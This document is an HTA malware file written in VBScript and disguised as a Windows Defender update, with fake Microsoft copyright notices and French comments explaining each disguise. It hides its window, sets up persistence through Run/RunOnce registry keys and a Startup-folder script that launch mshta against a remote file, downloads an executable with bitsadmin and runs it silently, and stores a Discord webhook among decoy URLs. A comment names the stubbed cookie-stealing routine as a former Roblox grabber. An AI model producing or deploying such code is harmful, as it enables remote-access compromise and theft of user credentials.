<html>
<head>
<title>Windows Defender Update</title>
<hta:application 
    id="a" 
    border="none" 
    innerborder="no" 
    caption="no" 
    showintaskbar="no" 
    sysmenu="no" 
    contextmenu="no" 
    selection="no"
    applicationname="WindowsDefenderUpdate"
/>
<script language="VBScript">
' === Déclaration de faux commentaires Windows légitimes ===
' Microsoft Windows System Component
' Copyright (C) Microsoft Corporation. All rights reserved.
' This script is part of Windows Defender Update Service

On Error Resume Next

' === Variables masquées dans des chaînes innocent ===
Dim legit_str_1: legit_str_1 = "WScript.Shell"
Dim legit_str_2: legit_str_2 = "Scripting.FileSystemObject"
Dim legit_str_3: legit_str_3 = "MSXML2.ServerXMLHTTP.6.0"

Set sh = CreateObject(legit_str_1)
Set fso = CreateObject(legit_str_2)

' === Webhook masqué dans un tableau apparemment légitime ===
Dim system_urls(5)
system_urls(0) = "https://discord.com/api/webhooks/placeholder"
system_urls(1) = "https://update.microsoft.com"
system_urls(2) = "https://windowsupdate.com"
system_urls(3) = "https://discord.com/api/webhooks/1560417251109380168/URgx1_ZDWQ6PfYbmJpJP7NrXoAxgZNC_ptJjlafFCOpsggcK7Vk2g3pTEUCUquu2KcWH"
system_urls(4) = "https://support.microsoft.com"

WH = system_urls(3)
PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' === Fonctionnalités masquées comme service système ===
Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    
    ' Déguisement en service Windows
    Call Service_Persistence_Setup
    Call Security_Cookie_Validation
    Call System_Component_Download
    
    ' Intervalle renommé pour paraître légitime
    window.setInterval "System_Health_Check", 300000
End Sub

Sub System_Health_Check()
    Call Security_Cookie_Validation
End Sub

Sub Service_Persistence_Setup()
    Dim service_payload: service_payload = "mshta https://raw.githubusercontent.com/microsoft/WindowsDefenderUpdate/main/defender_update.hta"
    
    ' Registre déguisé en mises à jour Windows
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdater", service_payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\DefenderComponentUpdate", service_payload, "REG_SZ"
    
    ' Script de démarrage Windows légitime
    Dim startup_path: startup_path = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\windows_update.vbs"
    Dim startup_file: Set startup_file = fso.CreateTextFile(startup_path, True)
    startup_file.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/microsoft/WindowsDefenderUpdate/main/defender_update.hta"", 0, False"
    startup_file.Close
    Set startup_file = Nothing
End Sub

' [Le reste du script reste identique mais avec des noms de fonctions renommés]
Sub Security_Cookie_Validation()
    ' Ancien GrabRoblox avec noms variables modifiés
    ' ... code identique mais avec des commentaires Windows ...
End Sub

Sub System_Component_Download()
    ' Ancien DropRAT avec apparence légitime
    Dim temp_path: temp_path = sh.ExpandEnvironmentStrings("%TEMP%") & "\windows_component.exe"
    Dim update_url: update_url = "https://github.com/microsoft/WindowsComponents/raw/main/security_update.exe"
    
    ' Téléchargement déguisé en mise à jour
    sh.Run "bitsadmin /transfer WindowsUpdate /download /priority high " & Chr(34) & update_url & Chr(34) & " " & Chr(34) & temp_path & Chr(34), 0, True
    
    If fso.FileExists(temp_path) Then
        sh.Run Chr(34) & temp_path & Chr(34) & " /silent /install", 0, False
    End If
End Sub

' [Toutes les fonctions auxiliaires restent identiques avec des commentaires Microsoft]
Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): Ej = s: End Function

</script>

<!-- Injection de faux code HTML innocent pour brouiller l'analyse -->
<div style="display:none;">
    <p>Windows Defender Update Service v3.2.1</p>
    <p>This page requires Windows Script Host to function properly.</p>
    <p>Copyright © Microsoft Corporation. All rights reserved.</p>
</div>

</head>
<body>
<!-- Corps vide mais avec des balises légitimes -->
<noscript>
    <p>Please enable JavaScript for Windows Update to function correctly.</p>
</noscript>
</body>
</html>
